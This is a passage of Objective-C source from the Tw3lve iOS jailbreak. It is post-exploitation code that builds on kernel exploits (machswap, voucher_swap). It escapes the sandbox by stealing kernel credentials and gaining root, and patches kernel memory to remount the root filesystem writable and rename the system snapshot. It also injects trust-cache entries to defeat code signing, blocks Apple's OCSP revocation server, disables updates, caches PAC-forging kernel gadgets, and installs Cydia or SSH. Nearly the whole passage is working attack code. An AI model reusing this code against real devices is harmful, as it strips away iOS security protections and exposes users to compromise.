    _assert(ISADDR(myOriginalCredAddr), @"Failed to escape sandbox.", true);
    _assert(setuid(0) == ERR_SUCCESS, @"Failed to escape sandbox.", true);
    _assert(getuid() == 0, @"Failed to escape sandbox.", true);
    myHost = mach_host_self();
    set_platform_binary(myProcAddr, true);
    set_cs_platform_binary(myProcAddr, true);
    LOG("Successfully escaped Sandbox.");
    
    
    //HSP4
    LOG("Setting HSP4 as TFP0...");
    remap_tfp0_set_hsp4(&tfp0);
    LOG("Successfully set HSP4 as TFP0.");
    unexport_tfp0(myOriginalHost);
    _assert(init_kexecute(), @"Failed To Init Kexecute!", true);
    
    
    //LOG
    LOG("Logging slide...");
    NSString *file = @(SLIDE_FILE);
    NSData *fileData = [[NSString stringWithFormat:@(ADDR "\n"), kernel_slide] dataUsingEncoding:NSUTF8StringEncoding];
    if (![[NSData dataWithContentsOfFile:file] isEqual:fileData]) {
        _assert(clean_file(file.UTF8String), @"Error loggin k_slide", true);
        _assert(create_file_data(file.UTF8String, 0, 0644, fileData), @"Failed to log slide.", true);
    }
    LOG("Successfully logged slide.");
    
    
    
    
    
    
    /**************************************
     
     
            THE BIG BAD ROOTFS OWO
     
     **************************************/
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Remounting RootFS..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    LOG("Remounting RootFS...");
    int rootfd = open("/", O_RDONLY);
    _assert(rootfd > 0, @"Failed to remount RootFS.", true);
    const char **snapshots = snapshot_list(rootfd);
    const char *origfs = "orig-fs";
    bool has_origfs = false;
    const char *thedisk = "/dev/disk0s1s1";
    _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, @"Failed to remount RootFS.", true);
    if (snapshots == NULL) {
        
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] NO SNAPSHOT FOUND! Creating a new one..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        close(rootfd);
        
        uint64_t devVnode = vnodeForPath(thedisk);
        _assert(ISADDR(devVnode), @"Failed to clear dev vnode's si_flags.", true);
        uint64_t v_specinfo = ReadKernel64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
        _assert(ISADDR(v_specinfo), @"Failed to clear dev vnode's si_flags.", true);
        WriteKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS), 0);
        uint32_t si_flags = ReadKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
        _assert(si_flags == 0, @"Failed to clear dev vnode's si_flags.", true);
        _assert(_vnode_put(devVnode) == ERR_SUCCESS, @"Failed to clear dev vnode's si_flags.", true);
        
        LOG("Mounting RootFS...");
        _assert(!is_mountpoint("/var/MobileSoftwareUpdate/mnt1"), @"RootFS already mounted, delete OTA file from Settings - Storage if present and reboot.", true);
        const char *rootFsMountPoint = "/private/var/tmp/jb/mnt1";
        if (is_mountpoint(rootFsMountPoint)) {
            _assert(unmount(rootFsMountPoint, MNT_FORCE) == ERR_SUCCESS, @"Failed to clear dev vnode's si_flags.", true);
        }
        _assert(clean_file(rootFsMountPoint), @"Failed to clear dev vnode's si_flags.", true);
        _assert(ensure_directory(rootFsMountPoint, 0, 0755), @"Failed to clear dev vnode's si_flags.", true);
        const char *argv[] = {"/sbin/mount_apfs", thedisk, rootFsMountPoint, NULL};
        _assert(runCommandv(argv[0], 3, argv, ^(pid_t pid) {
            uint64_t procStructAddr = get_proc_struct_for_pid(pid);
            LOG("procStructAddr = " ADDR, procStructAddr);
            _assert(ISADDR(procStructAddr), @"Failed to clear dev vnode's si_flags.", true);
            give_creds_to_process_at_addr(procStructAddr, kernelCredAddr);
        }) == ERR_SUCCESS, @"Failed to clear dev vnode's si_flags.", true);
        _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, @"Failed to clear dev vnode's si_flags.", true);
        const char *systemSnapshotLaunchdPath = [@(rootFsMountPoint) stringByAppendingPathComponent:@"sbin/launchd"].UTF8String;
        _assert(waitForFile(systemSnapshotLaunchdPath) == ERR_SUCCESS, @"Failed to clear dev vnode's si_flags.", true);
        LOG("Successfully mounted RootFS.");
        
        // Rename system snapshot.
        
        LOG("Renaming system snapshot...");
        rootfd = open(rootFsMountPoint, O_RDONLY);
        _assert(rootfd > 0, @"Error renaming snapshot", true);
        snapshots = snapshot_list(rootfd);
        _assert(snapshots != NULL, @"Error renaming snapshot", true);
        LOG("Snapshots on newly mounted RootFS:");
        for (const char **snapshot = snapshots; *snapshot; snapshot++) {
            LOG("\t%s", *snapshot);
        }
        free(snapshots);
        snapshots = NULL;
        NSString *systemVersionPlist = @"/System/Library/CoreServices/SystemVersion.plist";
        NSString *rootSystemVersionPlist = [@(rootFsMountPoint) stringByAppendingPathComponent:systemVersionPlist];
        _assert(rootSystemVersionPlist != nil, @"Error renaming snapshot", true);
        NSDictionary *snapshotSystemVersion = [NSDictionary dictionaryWithContentsOfFile:systemVersionPlist];
        _assert(snapshotSystemVersion != nil, @"Error renaming snapshot", true);
        NSDictionary *rootfsSystemVersion = [NSDictionary dictionaryWithContentsOfFile:rootSystemVersionPlist];
        _assert(rootfsSystemVersion != nil, @"Error renaming snapshot", true);
        if (![rootfsSystemVersion[@"ProductBuildVersion"] isEqualToString:snapshotSystemVersion[@"ProductBuildVersion"]]) {
            LOG("snapshot VersionPlist: %@", snapshotSystemVersion);
            LOG("rootfs VersionPlist: %@", rootfsSystemVersion);
            _assert("BuildVersions match"==NULL, @"Error renaming snapshot/root_msg", true);
        }
        const char *test_snapshot = "test-snapshot";
        _assert(fs_snapshot_create(rootfd, test_snapshot, 0) == ERR_SUCCESS, @"Error renaming snapshot", true);
        _assert(fs_snapshot_delete(rootfd, test_snapshot, 0) == ERR_SUCCESS, @"Error renaming snapshot", true);
        char *systemSnapshot = copySystemSnapshot();
        _assert(systemSnapshot != NULL, @"Error renaming snapshot", true);
        uint64_t system_snapshot_vnode = 0;
        uint64_t system_snapshot_vnode_v_data = 0;
        uint32_t system_snapshot_vnode_v_data_flag = 0;
        if (kCFCoreFoundationVersionNumber >= 1535.12) {
            system_snapshot_vnode = vnodeForSnapshot(rootfd, systemSnapshot);
            LOG("system_snapshot_vnode = " ADDR, system_snapshot_vnode);
            _assert(ISADDR(system_snapshot_vnode),  @"Error renaming snapshot", true);
            system_snapshot_vnode_v_data = ReadKernel64(system_snapshot_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_DATA));
            LOG("system_snapshot_vnode_v_data = " ADDR, system_snapshot_vnode_v_data);
            _assert(ISADDR(system_snapshot_vnode_v_data),  @"Error renaming snapshot", true);
            system_snapshot_vnode_v_data_flag = ReadKernel32(system_snapshot_vnode_v_data + 49);
            LOG("system_snapshot_vnode_v_data_flag = 0x%x", system_snapshot_vnode_v_data_flag);
            WriteKernel32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag & ~0x40);
        }
        _assert(fs_snapshot_rename(rootfd, systemSnapshot, origfs, 0) == ERR_SUCCESS,  @"Error renaming snapshot", true);
        if (kCFCoreFoundationVersionNumber >= 1535.12) {
            WriteKernel32(system_snapshot_vnode_v_data + 49, system_snapshot_vnode_v_data_flag);
            _assert(_vnode_put(system_snapshot_vnode) == ERR_SUCCESS,  @"Error renaming snapshot", true);
        }
        free(systemSnapshot);
        systemSnapshot = NULL;
        LOG("Successfully renamed system snapshot.");
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Done! Rebooting..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        
         NOTICE(NSLocalizedString(@"We just took a snapshot of your RootFS in case you want to restore it later. We are going to reboot your device now.", nil), 1, 1);
        
        // Reboot.
        close(rootfd);
        
        LOG("Rebooting...");
        reboot(RB_QUICK);
        LOG("Successfully rebooted.");
    } else {
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] No need to make a new snapshot, we already have one."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        
        for (const char **snapshot = snapshots; *snapshot; snapshot++) {
            if (strcmp(origfs, *snapshot) == 0) {
                has_origfs = true;
            }
            LOG("%s", *snapshot);
        }
    }
    
    _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, @"Failed to mount", true);
    uint64_t rootfs_vnode = vnodeForPath("/");
    LOG("rootfs_vnode = " ADDR, rootfs_vnode);
    _assert(ISADDR(rootfs_vnode), @"Failed to mount", true);
    uint64_t v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
    LOG("v_mount = " ADDR, v_mount);
    _assert(ISADDR(v_mount), @"Failed to mount", true);
    uint32_t v_flag = ReadKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG));
    if ((v_flag & (MNT_RDONLY | MNT_NOSUID))) {
        v_flag = v_flag & ~(MNT_RDONLY | MNT_NOSUID);
        WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag & ~MNT_ROOTFS);
        _assert(runCommand("/sbin/mount", "-u", thedisk, NULL) == ERR_SUCCESS, @"Failed to mount", true);
        WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
    }
    _assert(_vnode_put(rootfs_vnode) == ERR_SUCCESS, @"Failed to mount", true);
    _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, @"Failed to mount", true);
    
    
    /***************************
     
            RESTORE ROOTFS
     
     ***************************/
    // Rename system snapshot.
    
    
    if (restore_rootfs_bool)
    {
        
        NOTICE(NSLocalizedString(@"We are going to restore your RootFS. This MAY take a while. Please do not lock the device, quit the app, or reboot.", nil), 1, 1);
        LOG("Renaming system snapshot back...");
        int rootfd = open("/", O_RDONLY);
        _assert(rootfd > 0, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
        const char **snapshots = snapshot_list(rootfd);
        _assert(snapshots != NULL, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
        const char *snapshot = *snapshots;
        LOG("%s", snapshot);
        _assert(snapshot != NULL, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
        if (kCFCoreFoundationVersionNumber < 1452.23) {
            const char *systemSnapshotMountPoint = "/private/var/tmp/jb/mnt2";
            if (is_mountpoint(systemSnapshotMountPoint)) {
                _assert(unmount(systemSnapshotMountPoint, MNT_FORCE) == ERR_SUCCESS, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            }
            _assert(clean_file(systemSnapshotMountPoint), @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            _assert(ensure_directory(systemSnapshotMountPoint, 0, 0755), @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            _assert(fs_snapshot_mount(rootfd, systemSnapshotMountPoint, snapshot, 0) == ERR_SUCCESS, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            const char *systemSnapshotLaunchdPath = [@(systemSnapshotMountPoint) stringByAppendingPathComponent:@"sbin/launchd"].UTF8String;
            _assert(waitForFile(systemSnapshotLaunchdPath) == ERR_SUCCESS, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            _assert(extractDebsForPkg(@"rsync", nil, false), @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            _assert(injectTrustCache(@[@"/usr/bin/rsync"], GETOFFSET(trustcache), pmap_load_trust_cache) == ERR_SUCCESS, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            _assert(runCommand("/usr/bin/rsync", "-vaxcH", "--progress", "--delete-after", "--exclude=/Developer", [@(systemSnapshotMountPoint) stringByAppendingPathComponent:@"."].UTF8String, "/", NULL) == 0, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            unmount(systemSnapshotMountPoint, MNT_FORCE);
        } else {
            char *systemSnapshot = copySystemSnapshot();
            _assert(systemSnapshot != NULL, @"Failed to mount", true);
            _assert(fs_snapshot_rename(rootfd, snapshot, systemSnapshot, 0) == ERR_SUCCESS, @"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", true);
            free(systemSnapshot);
            systemSnapshot = NULL;
        }
        close(rootfd);
        free(snapshots);
        snapshots = NULL;
        LOG("Successfully renamed system snapshot back.");
        
        // Clean up.
        
        LOG("Cleaning up...");
        static const char *cleanUpFileList[] = {
            "/var/cache",
            "/var/lib",
            "/var/stash",
            "/var/db/stash",
            "/var/mobile/Library/Cydia",
            "/var/mobile/Library/Caches/com.saurik.Cydia",
            NULL
        };
        for (const char **file = cleanUpFileList; *file != NULL; file++) {
            clean_file(*file);
        }
        LOG("Successfully cleaned up.");
        
        // Disallow SpringBoard to show non-default system apps.
        
        LOG("Disallowing SpringBoard to show non-default system apps...");
        _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.springboard.plist", ^(id plist) {
            plist[@"SBShowNonDefaultSystemApps"] = @NO;
        }), @"Failed to disallow SpringBoard to show non-default system apps.", true);
        LOG("Successfully disallowed SpringBoard to show non-default system apps.");
        
        // Disable RootFS Restore.
        
        LOG("Disabling RootFS Restore...");
        _assert(modifyPlist(prefsFile, ^(id plist) {
            plist[RESTORE_FS] = @NO;
        }), @"Failed to disable RootFS Restore.", true);
        LOG("Successfully disabled RootFS Restore.");
        
        
        // Reboot.
        
        NOTICE(NSLocalizedString(@"RootFS Restored! We will reboot your device.", nil), 1, 1);
        
        LOG("Rebooting...");
        LOG("I don't feel so good...");
        reboot(RB_QUICK);
        LOG("Successfully rebooted.");
        
    }
    
    
    
    //APP REVOKES
    if (disable_app_revokes)
    {
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Disabling App Revokes..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        NSArray <NSString *> *array = @[@"/var/Keychains/ocspcache.sqlite3",
                                        @"/var/Keychains/ocspcache.sqlite3-shm",
                                        @"/var/Keychains/ocspcache.sqlite3-wal"];
        
        LOG("Disabling app revokes...");
        blockDomainWithName("ocsp.apple.com");
        for (NSString *path in array) {
            ensure_symlink("/dev/null", path.UTF8String);
        }
        LOG("Successfully disabled app revokes.");
    } else
    {
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Enabling App Revokes..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        NSArray <NSString *> *array = @[@"/var/Keychains/ocspcache.sqlite3",
                                        @"/var/Keychains/ocspcache.sqlite3-shm",
                                        @"/var/Keychains/ocspcache.sqlite3-wal"];
        
        LOG("Enabling app revokes...");
        unblockDomainWithName("ocsp.apple.com");
        for (NSString *path in array) {
            if (is_symlink(path.UTF8String)) {
                clean_file(path.UTF8String);
            }
        }
        LOG("Successfully enabled app revokes.");
        
    }
    
    if (disable_auto_updates)
    {
        
        NSArray <NSString *> *array = @[@"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate",
                                        @"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation",
                                        @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate",
                                        @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation"];
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Disabling Auto Updates..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        LOG("Disabling Auto Updates...");
        for (NSString *path in array) {
            ensure_symlink("/dev/null", path.UTF8String);
        }
        _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.Preferences.plist", ^(id plist) {
            plist[@"kBadgedForSoftwareUpdateKey"] = @NO;
            plist[@"kBadgedForSoftwareUpdateJumpOnceKey"] = @NO;
        }), @"Failed to disable auto updates.", true);
        LOG("Successfully disabled Auto Updates.");
        
    } else
    {
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Enabling Auto Updates..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        NSArray <NSString *> *array = @[@"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate",
                                        @"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation",
                                        @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate",
                                        @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation"];
        
        LOG("Enabling Auto Updates...");
        for (NSString *path in array) {
            ensure_directory(path.UTF8String, 0, 0755);
        }
        _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.Preferences.plist", ^(id plist) {
            plist[@"kBadgedForSoftwareUpdateKey"] = @YES;
            plist[@"kBadgedForSoftwareUpdateJumpOnceKey"] = @YES;;
        }), @"Failed to enable auto updates.", true);
        
    }
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Creating our directory..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    //JB DIR
    LOG("Creating jailbreak directory...");
    _assert(ensure_directory("/jb", 0, 0755), @"Failed to create jailbreak directory.", true);
    _assert(chdir("/jb") == ERR_SUCCESS, @"Failed to create jailbreak directory.", true);
    LOG("Successfully created jailbreak directory.");
    
    
    NSString *offsetsFile = @"/jb/offsets.plist";
    NSMutableDictionary *dictionary = [NSMutableDictionary new];
#define CACHEADDR(value, name) do { \
dictionary[@(name)] = ADDRSTRING(value); \
} while (false)
#define CACHEOFFSET(offset, name) CACHEADDR(GETOFFSET(offset), name)
    CACHEADDR(kernel_base, "KernelBase");
    CACHEADDR(kernel_slide, "KernelSlide");
    CACHEOFFSET(trustcache, "TrustChain");
    CACHEADDR(ReadKernel64(GETOFFSET(OSBoolean_True)), "OSBooleanTrue");
    CACHEADDR(ReadKernel64(GETOFFSET(OSBoolean_True)) + sizeof(void *), "OSBooleanFalse");
    CACHEOFFSET(osunserializexml, "OSUnserializeXML");
    CACHEOFFSET(smalloc, "Smalloc");
    CACHEOFFSET(add_x0_x0_0x40_ret, "AddRetGadget");
    CACHEOFFSET(zone_map_ref, "ZoneMapOffset");
    CACHEOFFSET(vfs_context_current, "VfsContextCurrent");
    CACHEOFFSET(vnode_lookup, "VnodeLookup");
    CACHEOFFSET(vnode_put, "VnodePut");
    CACHEOFFSET(kernel_task, "KernelTask");
    CACHEOFFSET(shenanigans, "Shenanigans");
    CACHEOFFSET(lck_mtx_lock, "LckMtxLock");
    CACHEOFFSET(lck_mtx_unlock, "LckMtxUnlock");
    CACHEOFFSET(vnode_get_snapshot, "VnodeGetSnapshot");
    CACHEOFFSET(fs_lookup_snapshot_metadata_by_name_and_return_name, "FsLookupSnapshotMetadataByNameAndReturnName");
    CACHEOFFSET(pmap_load_trust_cache, "PmapLoadTrustCache");
    CACHEOFFSET(apfs_jhash_getvnode, "APFSJhashGetVnode");
    CACHEOFFSET(paciza_pointer__l2tp_domain_module_start, "PacizaPointerL2TPDomainModuleStart");
    CACHEOFFSET(paciza_pointer__l2tp_domain_module_stop, "PacizaPointerL2TPDomainModuleStop");
    CACHEOFFSET(l2tp_domain_inited, "L2TPDomainInited");
    CACHEOFFSET(sysctl__net_ppp_l2tp, "SysctlNetPPPL2TP");
    CACHEOFFSET(sysctl_unregister_oid, "SysctlUnregisterOid");
    CACHEOFFSET(mov_x0_x4__br_x5, "MovX0X4BrX5");
    CACHEOFFSET(mov_x9_x0__br_x1, "MovX9X0BrX1");
    CACHEOFFSET(mov_x10_x3__br_x6, "MovX10X3BrX6");
    CACHEOFFSET(kernel_forge_pacia_gadget, "KernelForgePaciaGadget");
    CACHEOFFSET(kernel_forge_pacda_gadget, "KernelForgePacdaGadget");
    CACHEOFFSET(IOUserClient__vtable, "IOUserClientVtable");
    CACHEOFFSET(IORegistryEntry__getRegistryEntryID, "IORegistryEntryGetRegistryEntryID");
#undef CACHEOFFSET
#undef CACHEADDR
    if (![[NSMutableDictionary dictionaryWithContentsOfFile:offsetsFile] isEqual:dictionary]) {
        // Cache offsets.
        
        LOG("Caching offsets...");
        _assert(([dictionary writeToFile:offsetsFile atomically:YES]), @"Failed to cache offsets.", true);
        _assert(init_file(offsetsFile.UTF8String, 0, 0644), @"Failed to cache offsets.", true);
        LOG("Successfully cached offsets.");
    }
    
    
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Hey, SpringBoard! Show me non-default system apps, please!"];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    LOG("Allowing SpringBoard to show non-default system apps...");
    _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.springboard.plist", ^(id plist) {
        plist[@"SBShowNonDefaultSystemApps"] = @YES;
    }), @"Failed to edit plist", true);
    LOG("Successfully allowed SpringBoard to show non-default system apps.");
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] SpringBoard kindly accepted our request."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    
    
    if (A12)
    {
        runOnMainQueueWithoutDeadlocking(^{
        
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Enabling SSH..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        enableSSH();
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] SSH OwO?"];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
    } else {
        installCydia();
    }
    
    
    LOG(@"DONE!");
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] We Finished The Jailbreak!"];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Kernel Base: "];
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:[NSString stringWithFormat:@"%llx", kernel_base]];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Kernel Slide: "];
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:[NSString stringWithFormat:@"%llx", kernel_slide]];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    
    //CLEAN
    LOG("Deinitializing kexecute...");
    term_kexecute();
    LOG("Unplatformizing...");
    set_platform_binary(myProcAddr, false);
    set_cs_platform_binary(myProcAddr, false);
    LOG("Sandboxing...");
    _assert(give_creds_to_process_at_addr(myProcAddr, myOriginalCredAddr) == kernelCredAddr, @"Failed to de-elevate", true);
    LOG("Downgrading host port...");
    _assert(setuid(myUid) == ERR_SUCCESS, @"Failed to de-elevate", true);
    _assert(getuid() == myUid, @"Failed to de-elevate", true);
    LOG("Restoring shenanigans pointer...");
    WriteKernel64(GETOFFSET(shenanigans), Shenanigans);
    LOG("Deallocating ports...");
    _assert(mach_port_deallocate(mach_task_self(), myHost) == KERN_SUCCESS, @"Failed to de-elevate", true);
    myHost = HOST_NULL;
    _assert(mach_port_deallocate(mach_task_self(), myOriginalHost) == KERN_SUCCESS, @"Failed to de-elevate", true);
    myOriginalHost = HOST_NULL;
    
    //0 = machswap
    //1 = machswap2
    //2 = voucher_swap
    
    
    
    
    LOG(@"Finished!");
    if (exploit == 0 || exploit == 1) {
        WriteKernel64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL), ReadKernel64(kernelCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)));
        WriteKernel64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_UID), 0);
        _assert(restartSpringBoard(), @"Failed To Restart SpringBoard", true);
    } else {
        _assert(restartSpringBoard(), @"Failed To Restart SpringBoard", true);
    }
    
}

void installCydia()
{
    
    int rv = 0;
    bool needStrap = false;
    bool needSubstrate = false;
    bool skipSubstrate = false;
    NSMutableArray *debsToInstall = [NSMutableArray new];
    bool betaFirmware = false;
    
    
    runOnMainQueueWithoutDeadlocking(^{
        Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Copying important files..."];
        NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
        [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
    });
    
    
    //COPY RESOURCES
    LOG("Copying over our resources to RootFS...");
    
    _assert(chdir("/") == ERR_SUCCESS, @"Failed to copy over our resources to RootFS.", true);
    _assert(uninstallRootLessJB(), @"Failed to copy over our resources to RootFS.", true);
    _assert(ensureAptPkgLists(), @"Failed to copy over our resources to RootFS.", true);
    
    
    if (access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS)
    {
        needSubstrate = true;
    }
    
    if (access("/.installed_tw3lve", F_OK) != ERR_SUCCESS)
    {
        needStrap = true;
    }
    
    
    if (needSubstrate) {
        
        runOnMainQueueWithoutDeadlocking(^{
            Tw3lveViewController.sharedController.uilog.text = [Tw3lveViewController.sharedController.uilog.text stringByAppendingString:@"\n[Tw3lve] Installing Cydia Substrate..."];
            NSRange range = NSMakeRange(Tw3lveViewController.sharedController.uilog.text.length - 1, 1);
            [Tw3lveViewController.sharedController.uilog scrollRangeToVisible:range];
        });
        
        LOG(@"We need substrate.");
        NSString *substrateDeb = debForPkg(@"mobilesubstrate");
        _assert(substrateDeb != nil, @"Failed to copy over our resources to RootFS.", true);
        if (pidOfProcess("/usr/libexec/substrated") == 0) {
            _assert(extractDeb(substrateDeb), @"Failed to copy over our resources to RootFS.", true);
        } else {
            skipSubstrate = true;
            LOG("Substrate is running, not extracting again for now.");
        }
        [debsToInstall addObject:substrateDeb];
    }
    
    char *osversion = NULL;
    size_t size = 0;
    _assert(sysctlbyname("kern.osversion", NULL, &size, NULL, 0) == ERR_SUCCESS, @"Failed to copy over our resources to RootFS.", true);
    osversion = malloc(size);
    _assert(osversion != NULL, @"Failed to copy over our resources to RootFS.", true);
    _assert(sysctlbyname("kern.osversion", osversion, &size, NULL, 0) == ERR_SUCCESS, @"Failed to copy over our resources to RootFS.", true);
    if (strlen(osversion) > 6) {
        betaFirmware = true;
        LOG("Detected beta firmware.");
    }
    free(osversion);
    osversion = NULL;
    NSArray *resourcesPkgs = resolveDepsForPkg(@"jailbreak-resources", true);
    _assert(resourcesPkgs != nil, @"Failed to copy over our resources to RootFS.", true);
    
